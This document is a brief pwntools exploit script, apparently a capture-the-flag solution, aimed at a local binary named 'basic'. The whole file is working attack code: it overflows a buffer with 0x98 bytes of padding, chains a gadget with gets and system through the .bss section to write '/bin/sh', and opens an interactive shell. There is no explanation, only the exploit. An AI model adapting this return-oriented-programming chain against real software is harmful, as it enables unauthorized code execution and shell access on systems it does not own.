from pwn import *

context.arch = 'amd64'
r = process('/home/basic/basic')

system_plt = 0x4004f0
gets_plt = 0x400520
gg1 = 0x400743
bss = 0x60107B

p = 'a' * 0x98
p += flat(
	gg1,
	bss,
	gets_plt,
	gg1,
	bss,
	system_plt
)

r.send(p)
r.sendline('/bin/sh\x00')
r.interactive()


